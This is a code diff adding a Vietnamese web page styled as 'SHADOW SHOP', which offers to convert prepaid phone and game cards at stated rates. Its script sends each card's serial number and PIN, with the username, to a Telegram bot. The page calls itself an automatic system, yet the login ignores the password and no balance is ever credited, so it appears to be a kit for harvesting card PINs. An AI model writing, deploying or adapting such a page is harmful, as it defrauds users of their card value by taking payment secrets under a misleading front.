@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHADOW SHOP - VIP SYSTEM</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --primary: #7b2cbf; --cyan: #00f2ff; --bg: #050505; --card: #12141d; --text: #e2e8f0; --red: #ff4d4d; --green: #00ff88; --orange: #f39c12; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: var(--bg); color: var(--text); margin: 0; overflow-x: hidden; }
+        
+        /* GIAO DIỆN CHÍNH */
+        .header { background: var(--card); padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--primary); position: sticky; top: 0; z-index: 100; }
+        .container { padding: 15px; max-width: 900px; margin: auto; }
+        .card { background: var(--card); border-radius: 20px; border: 1px solid #2d334a; margin-bottom: 25px; padding: 20px; }
+        
+        /* INPUT & BUTTON */
+        .input-pro { width: 100%; padding: 14px; margin: 10px 0; background: #080a12; border: 1px solid #333; color: white; border-radius: 12px; outline: none; font-size: 15px; }
+        .input-pro:focus { border-color: var(--cyan); }
+        .btn-main { width: 100%; padding: 16px; background: var(--cyan); border: none; font-weight: 900; cursor: pointer; border-radius: 12px; color: #000; transition: 0.3s; text-transform: uppercase; }
+        
+        /* CHIẾT KHẤU BOX */
+        .res-box { background: rgba(0, 255, 136, 0.1); border: 1px dashed var(--green); padding: 15px; border-radius: 12px; text-align: center; margin: 15px 0; }
+        .res-box span { color: var(--green); font-size: 20px; font-weight: 800; }
+        
+        /* SIDEBAR (Rút gọn cho nhanh) */
+        .sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: var(--card); transition: 0.4s; z-index: 1000; padding: 25px; border-right: 1px solid var(--primary); }
+        .sidebar.active { left: 0; }
+        .menu-item { padding: 15px; cursor: pointer; display: flex; align-items: center; gap: 12px; border-radius: 10px; }
+
+        #auth-ui { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #000; }
+    </style>
+</head>
+<body>
+
+    <div id="auth-ui">
+        <div style="width:90%; max-width:400px; background:var(--card); padding:40px; border-radius:30px; border:2px solid var(--primary); text-align:center;">
+            <h2 style="color:var(--cyan)">SHADOW LOGIN</h2>
+            <input type="text" id="user" class="input-pro" placeholder="Tên tài khoản...">
+            <input type="password" id="pass" class="input-pro" placeholder="Mật khẩu...">
+            <button class="btn-main" onclick="handleLogin()">ĐĂNG NHẬP</button>
+        </div>
+    </div>
+
+    <div id="main-app" style="display:none">
+        <div class="header">
+            <i class="fas fa-bars" onclick="toggleSidebar()" style="cursor:pointer; color:var(--cyan); font-size:22px;"></i>
+            <div style="font-weight:900;">SHADOW <span style="color:var(--cyan)">SHOP</span></div>
+            <div id="top-balance" style="color:var(--green); font-weight:bold;">0đ</div>
+        </div>
+
+        <div id="sidebar" class="sidebar">
+            <div class="menu-item" onclick="showPage('home')"><i class="fas fa-home"></i> Cửa Hàng</div>
+            <div class="menu-item" onclick="showPage('napthe')"><i class="fas fa-credit-card"></i> Nạp Thẻ Cào</div>
+            <div class="menu-item" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Đăng xuất</div>
+        </div>
+
+        <div id="page-napthe" class="container">
+            <div class="card">
+                <h3 style="text-align:center; color:var(--cyan); margin-top:0;">HỆ THỐNG NẠP THẺ TỰ ĐỘNG</h3>
+                
+                <label>Chọn loại thẻ:</label>
+                <select id="card-type" class="input-pro" onchange="updateAmounts()"></select>
+
+                <label>Chọn mệnh giá:</label>
+                <select id="card-amount" class="input-pro" onchange="calcCard()"></select>
+
+                <div class="res-box">
+                    Số tiền bạn sẽ nhận được:<br>
+                    <span id="card-res">0đ</span>
+                </div>
+
+                <input type="text" id="seri" class="input-pro" placeholder="Nhập số Seri">
+                <input type="text" id="pin" class="input-pro" placeholder="Nhập mã thẻ (PIN)">
+
+                <button class="btn-main" onclick="sendCard()" style="background:var(--green)">GỬI THẺ NGAY</button>
+                <p style="font-size:12px; color:var(--red); text-align:center; margin-top:10px;">* Lưu ý: Chọn sai mệnh giá sẽ mất thẻ.</p>
+            </div>
+        </div>
+
+        <div id="page-home" class="container" style="display:none">
+            <h2 style="text-align:center">Chào mừng quay trở lại!</h2>
+        </div>
+    </div>
+
+    <script>
+        // CẤU HÌNH TELEGRAM CỦA VINH
+        const TELE_TOKEN = 'TOKEN_BOT_CỦA_VINH'; 
+        const CHAT_ID = 'ID_CHAT_CỦA_VINH';
+
+        // BẢNG CHIẾT KHẤU NHƯ TRONG VIDEO
+        const CARD_DATA = {
+            "Viettel": { rate: 0.87, amounts: [10000, 20000, 30000, 50000, 100000, 200000, 300000, 500000, 1000000] },
+            "Vinaphone": { rate: 0.86, amounts: [10000, 20000, 30000, 50000, 100000, 200000, 300000, 500000] },
+            "Garena": { rate: 0.875, amounts: [10000, 20000, 50000, 100000, 200000, 500000] },
+            "Mobifone": { rate: 0.80, amounts: [10000, 20000, 30000, 50000, 100000, 200000, 300000, 500000] },
+            "Zing": { rate: 0.875, amounts: [10000, 20000, 50000, 100000, 200000, 500000, 1000000] },
+            "Vcoin": { rate: 0.87, amounts: [10000, 20000, 50000, 100000, 200000, 300000, 500000, 1000000, 2000000, 5000000] },
+            "Scoin": { rate: 0.67, amounts: [10000, 20000, 50000, 100000, 200000, 300000, 500000, 1000000, 2000000, 5000000] }
+        };
+
+        let db = JSON.parse(localStorage.getItem('shadow_v10')) || { users: {}, cur: null };
+
+        function updateAmounts() {
+            let type = document.getElementById('card-type').value;
+            let amountSel = document.getElementById('card-amount');
+            let data = CARD_DATA[type];
+            
+            amountSel.innerHTML = data.amounts.map(a => 
+                `<option value="${a}">${a.toLocaleString()}đ - Nhận ${(a * data.rate).toLocaleString()}đ</option>`
+            ).join('');
+            calcCard();
+        }
+
+        function calcCard() {
+            let type = document.getElementById('card-type').value;
+            let amount = document.getElementById('card-amount').value;
+            let received = Math.floor(amount * CARD_DATA[type].rate);
+            document.getElementById('card-res').innerText = received.toLocaleString() + "đ";
+        }
+
+        function sendCard() {
+            let t = document.getElementById('card-type').value;
+            let a = document.getElementById('card-amount').value;
+            let s = document.getElementById('seri').value.trim();
+            let p = document.getElementById('pin').value.trim();
+            let r = Math.floor(a * CARD_DATA[t].rate);
+
+            if(!s || !p) return alert("Vinh nhắc khách nhập đủ Seri và PIN nhé!");
+
+            const msg = `💳 THẺ MỚI: ${t}\n👤 Khách: ${db.cur}\n💰 Mệnh giá: ${parseInt(a).toLocaleString()}đ\n🎁 Thực nhận: ${r.toLocaleString()}đ\n📌 Seri: ${s}\n🔑 PIN: ${p}`;
+
+            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            }).then(() => {
+                alert("Gửi thành công! Đợi Vinh kiểm tra nhé.");
+                document.getElementById('seri').value = '';
+                document.getElementById('pin').value = '';
+            });
+        }
+
+        // INIT & LOGIN LOGIC
+        function initApp() {
+            document.getElementById('card-type').innerHTML = Object.keys(CARD_DATA).map(t => `<option value="${t}">${t}</option>`).join('');
+            updateAmounts();
+        }
+
+        function handleLogin() {
+            let u = document.getElementById('user').value;
+            db.cur = u; db.users[u] = db.users[u] || { bal: 0 };
+            localStorage.setItem('shadow_v10', JSON.stringify(db));
+            document.getElementById('auth-ui').style.display = 'none';
+            document.getElementById('main-app').style.display = 'block';
+            initApp();
+        }
+
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('active'); }
+        function showPage(p) { 
+            document.getElementById('page-home').style.display = (p==='home'?'block':'none');
+            document.getElementById('page-napthe').style.display = (p==='napthe'?'block':'none');
+            toggleSidebar();
+        }
+        function logout() { location.reload(); }
+    </script>
+</body>
+  </html>
+  
